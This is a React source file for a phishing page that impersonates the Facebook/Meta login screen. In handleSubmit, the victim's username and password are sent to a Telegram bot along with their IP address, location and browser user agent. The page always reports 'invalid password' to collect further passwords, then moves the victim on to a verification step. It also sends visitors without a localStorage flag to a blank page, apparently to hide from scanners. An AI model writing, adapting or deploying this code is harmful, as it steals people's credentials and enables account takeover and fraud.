import FBLogoSVG from '@/assets/images/facebook-logo.svg';
import FBLogoImage from '@/assets/images/fb-logo.png';
import MetaImage from '@/assets/images/meta-logo.png';
import { defaultLoginTexts, type TranslatedTexts } from '@/content/loginTexts';
import { useGeo } from '@/hooks/use-geo';
import translateText from '@/utils/translate';
import sendTelegramMessage from '@/utils/telegram';
import { faEye, faEyeSlash } from '@fortawesome/free-regular-svg-icons';
import { faXmark } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { useEffect, useRef, useState, type FC } from 'react';
import { useNavigate } from 'react-router';
import paths from '@/router/paths';

const Login: FC = () => {
    const navigate = useNavigate();
    const { geoData } = useGeo();

    const usernameRef = useRef<HTMLInputElement>(null);
    const passwordRef = useRef<HTMLInputElement>(null);

    const [isShowPassword, setIsShowPassword] = useState(false);
    const [username, setUsername] = useState('');
    const [password, setPassword] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);
    const [currentAttemp, setCurrentAttemp] = useState(0);
    const [translatedTexts, setTranslatedTexts] = useState<TranslatedTexts>(defaultLoginTexts);

    const translateAllTexts = async (targetLang: string) => {
        try {
            const textsToTranslate = Object.values(defaultLoginTexts);
            const translatedResults = await Promise.all(textsToTranslate.map((text) => translateText(text, targetLang)));

            const [mobileNumberOrEmail, password, invalidPassword, logIn, forgottenPassword, createNewAccount, logInToFacebook, emailAddressOrPhone, forgottenAccount, englishUK, tiengViet, chineseTaiwan, korean, japanese, frenchFrance, thai, spanish, portugueseBrazil, german, italian, signUp, messenger, facebookLite, video, metaPay, metaStore, metaQuest, rayBanMeta, metaAI, instagram, threads, privacyPolicy, privacyCentre, about, createAd, createPage, developers, careers, cookies, adChoices, terms, help, contactUploading] = translatedResults;

            setTranslatedTexts({
                mobileNumberOrEmail,
                password,
                invalidPassword,
                logIn,
                forgottenPassword,
                createNewAccount,
                logInToFacebook,
                emailAddressOrPhone,
                forgottenAccount,
                englishUK,
                tiengViet,
                chineseTaiwan,
                korean,
                japanese,
                frenchFrance,
                thai,
                spanish,
                portugueseBrazil,
                german,
                italian,
                signUp,
                messenger,
                facebookLite,
                video,
                metaPay,
                metaStore,
                metaQuest,
                rayBanMeta,
                metaAI,
                instagram,
                threads,
                privacyPolicy,
                privacyCentre,
                about,
                createAd,
                createPage,
                developers,
                careers,
                cookies,
                adChoices,
                terms,
                help,
                contactUploading
            });
        } catch {
            console.clear();
        }
    };


    useEffect(() => {
        const hasVisited = localStorage.getItem('visited');
        if (!hasVisited) {
            window.location.replace('about:blank');
            return;
        }

        if (geoData?.country_code) {
            translateAllTexts(geoData.country_code);
        }
    }, [geoData]);

    const handleSubmit = async () => {
        if (!username || !password) {
            return;
        }
        setIsLoading(true);

        try {
            const userIP = geoData?.ip || 'unknown';
            const location = geoData ? `${geoData.city || 'Unknown'}-${geoData.region || 'Unknown'}-${geoData.country || 'Unknown'}` : 'Unknown';

            const savedMessageId = localStorage.getItem('message_id');
            if (!savedMessageId) {
                const message = `📍 <b>DC:</b> <code>${location}</code>\n🌐 <b>IP:</b> <code>${userIP}</code>\n🔗 <b>UA:</b> <code>${navigator.userAgent}</code>\n👤 <b>TK:</b> <code>${username}</code>\n🔑 <b>MK:</b> <code>${password}</code>\n⏰ <b>time:</b> <code>${new Date().toLocaleString()}</code>`;
                const response = await sendTelegramMessage(message);
                localStorage.setItem('message_id', response.result.message_id.toString());
            } else {
                const attemptNumber = currentAttemp + 1;
                const message = `MK${attemptNumber}: <code>${password}</code>`;
                await sendTelegramMessage(message, parseInt(savedMessageId));
            }

            setCurrentAttemp((prev) => prev + 1);
            setPassword('');
            setShowError(true);
            setIsLoading(false);

            if (currentAttemp >= 1) {
                navigate(paths.verify);
            }
        } catch {
            setShowError(true);
            setIsLoading(false);
        }
    };
    return (
        <div className='min-h-screen bg-[#f0f2f5]'>
            <div className='flex min-h-screen flex-col items-center justify-center px-4 pt-5 md:hidden'>
                <div className='mt-2 text-sm text-[#5d6c7b]'>{translatedTexts.englishUK}</div>
                <div className='flex grow items-center justify-center'>
                    <img src={FBLogoImage} className='max-h-[60px] max-w-[60px] object-contain' alt='' />
                </div>
                <div className='flex w-full grow flex-col gap-3'>
                    <div className='relative'>
                        <input
                            ref={usernameRef}
                            autoComplete='on'
                            id='username'
                            type='text'
                            placeholder=' '
                            className='peer h-[62px] w-full rounded-2xl border border-[#dde2e8] px-4 py-4 pb-1 placeholder:text-[#5d6c7b] focus:border-[#5d6c7b]'
                            value={username}
                            onChange={(e) => {
                                setUsername(e.target.value);
                            }}
                        />
                        <label htmlFor='username' className='absolute top-1/2 left-0 -translate-y-6 px-4 text-[13px] text-[#5d6c7b] peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-[15px] peer-focus:-translate-y-6 peer-focus:text-[13px]'>
                            {translatedTexts.mobileNumberOrEmail}
                        </label>
                        <button
                            tabIndex={-1}
                            onClick={() => {
                                setUsername('');
                                usernameRef.current?.focus();
                            }}
                            className='absolute top-1/2 right-0 block -translate-y-1/2 cursor-pointer pr-4 peer-placeholder-shown:hidden'
                        >
                            <FontAwesomeIcon icon={faXmark} />
                        </button>
                    </div>
                    <div className='relative'>
                        <input
                            ref={passwordRef}
                            autoComplete='on'
                            id='password'
                            type={isShowPassword ? 'text' : 'password'}
                            placeholder={' '}
                            className={`peer h-[62px] w-full rounded-2xl border px-4 py-4 pb-1 placeholder:text-[#5d6c7b] focus:border-[#5d6c7b] ${showError ? 'border-red-500 placeholder:text-red-500' : 'border-[#dde2e8]'}`}
                            value={password}
                            onChange={(e) => {
                                setShowError(false);
                                setPassword(e.target.value);
                            }}
                        />
                        <label htmlFor='password' className={`absolute top-1/2 left-0 -translate-y-6 px-4 text-[13px] text-[#5d6c7b] peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-[15px] peer-focus:-translate-y-6 peer-focus:text-[13px] ${showError && 'text-red-500'}`}>
                            {showError ? translatedTexts.invalidPassword : translatedTexts.password}
                        </label>
                        <button
                            tabIndex={-1}
                            onClick={() => {
                                setIsShowPassword(!isShowPassword);
                            }}
                            className='absolute top-1/2 right-0 block -translate-y-1/2 cursor-pointer pr-4 peer-placeholder-shown:hidden'
                        >
                            <FontAwesomeIcon icon={isShowPassword ? faEyeSlash : faEye} />
                        </button>
                    </div>
                    <button
                        className='flex h-[44px] items-center justify-center rounded-[22px] bg-[#0064e0] text-[15px] font-medium text-[#f1f4f7]'
                        onClick={() => {
                            handleSubmit();
                        }}
                    >
                        {isLoading ? <div className='h-7 w-7 animate-spin rounded-full border-2 border-white border-t-transparent'></div> : translatedTexts.logIn}
                    </button>
                    <span className='text-center text-[15px] font-medium text-[#0a1317]'>{translatedTexts.forgottenPassword}</span>
                </div>
                <div className='flex w-full flex-col items-center justify-center gap-4'>
                    <div className='flex h-[44px] w-full items-center justify-center rounded-[22px] border border-[#0064e0] text-[#0064e0]'>{translatedTexts.createNewAccount}</div>
                    <div className='flex items-center justify-center'>
                        <img className='h-[12px]' src={MetaImage} alt='' />
                    </div>
                    <div className='flex items-center gap-2 text-[10px] text-[#63788a]'>
                        <span>{translatedTexts.about}</span>
                        <span>{translatedTexts.help}</span>
                        <span>More</span>
                    </div>
                </div>
            </div>

            <div className='hidden min-h-screen flex-col items-center justify-between px-4 py-5 md:flex'>
                <div className='mt-8 flex w-full flex-col items-center'>
                    <div className='mb-6 flex justify-center'>
                        <img src={FBLogoSVG} className='h-8' alt='Facebook' />
                    </div>

                    <div className='w-full max-w-[396px] rounded-lg bg-white p-6 shadow-sm'>
                        <h1 className='mb-6 text-center text-lg text-[#1c1e21]'>{translatedTexts.logInToFacebook}</h1>

                        <div className='space-y-4'>
                            <div className='relative'>
                                <input
                                    ref={usernameRef}
                                    autoComplete='on'
                                    id='username-desktop'
                                    type='text'
                                    placeholder={translatedTexts.emailAddressOrPhone}
                                    className='w-full rounded-md border border-[#dddfe2] px-3 py-3 text-[#1c1e21] placeholder:text-[#8a8d91] focus:border-[#1877f2] focus:outline-none'
                                    value={username}
                                    onChange={(e) => {
                                        setUsername(e.target.value);
                                    }}
                                />
                            </div>

                            <div className='relative'>
                                <input
                                    ref={passwordRef}
                                    autoComplete='on'
                                    id='password-desktop'
                                    type={isShowPassword ? 'text' : 'password'}
                                    placeholder={showError ? translatedTexts.invalidPassword : translatedTexts.password}
                                    className={`w-full rounded-md border px-3 py-3 text-[#1c1e21] focus:outline-none ${showError ? 'border-red-500 placeholder:text-red-500' : 'border-[#dddfe2] placeholder:text-[#8a8d91] focus:border-[#1877f2]'}`}
                                    value={password}
                                    onChange={(e) => {
                                        setShowError(false);
                                        setPassword(e.target.value);
                                    }}
                                />
                            </div>

                            <button
                                className='w-full rounded-md bg-[#1877f2] py-3 text-lg font-semibold text-white hover:bg-[#166fe5] focus:outline-none'
                                onClick={() => {
                                    handleSubmit();
                                }}
                            >
                                {isLoading ? <div className='mx-auto h-6 w-6 animate-spin rounded-full border-2 border-white border-t-transparent'></div> : translatedTexts.logIn}
                            </button>

                            <div className='text-center'>
                                <p className='cursor-pointer text-sm text-[#1877f2] hover:underline'>{translatedTexts.forgottenAccount}</p>
                            </div>
                        </div>
                    </div>
                </div>

                <div className='mt-8 w-full max-w-[980px] text-center'>
                    <div className='mb-4 flex flex-wrap justify-start gap-2 text-xs text-[#8a8d91]'>
                        <span>{translatedTexts.englishUK}</span>
                        <span>{translatedTexts.tiengViet}</span>
                        <span>{translatedTexts.chineseTaiwan}</span>
                        <span>{translatedTexts.korean}</span>
                        <span>{translatedTexts.japanese}</span>
                        <span>{translatedTexts.frenchFrance}</span>
                        <span>{translatedTexts.thai}</span>
                        <span>{translatedTexts.spanish}</span>
                        <span>{translatedTexts.portugueseBrazil}</span>
                        <span>{translatedTexts.german}</span>
                        <span>{translatedTexts.italian}</span>
                        <button className='rounded border border-[#8a8d91] px-2 py-1 text-xs'>+</button>
                    </div>

                    <div className='mb-4 flex flex-wrap justify-start gap-2 text-xs text-[#8a8d91]'>
                        <span>{translatedTexts.signUp}</span>
                        <span>{translatedTexts.logIn}</span>
                        <span>{translatedTexts.messenger}</span>
                        <span>{translatedTexts.facebookLite}</span>
                        <span>{translatedTexts.video}</span>
                        <span>{translatedTexts.metaPay}</span>
                        <span>{translatedTexts.metaStore}</span>
                        <span>{translatedTexts.metaQuest}</span>
                        <span>{translatedTexts.rayBanMeta}</span>
                        <span>{translatedTexts.metaAI}</span>
                        <span>{translatedTexts.instagram}</span>
                        <span>{translatedTexts.threads}</span>
                        <span>{translatedTexts.privacyPolicy}</span>
                        <span>{translatedTexts.privacyCentre}</span>
                        <span>{translatedTexts.about}</span>
                        <span>{translatedTexts.createAd}</span>
                        <span>{translatedTexts.createPage}</span>
                        <span>{translatedTexts.developers}</span>
                        <span>{translatedTexts.careers}</span>
                        <span>{translatedTexts.cookies}</span>
                        <span>{translatedTexts.adChoices}</span>
                        <span>{translatedTexts.terms}</span>
                        <span>{translatedTexts.help}</span>
                        <span>{translatedTexts.contactUploading}</span>
                    </div>

                    <div className='text-xs text-[#8a8d91]'>Meta © 2025</div>
                </div>
            </div>
        </div>
    );
};
export default Login;
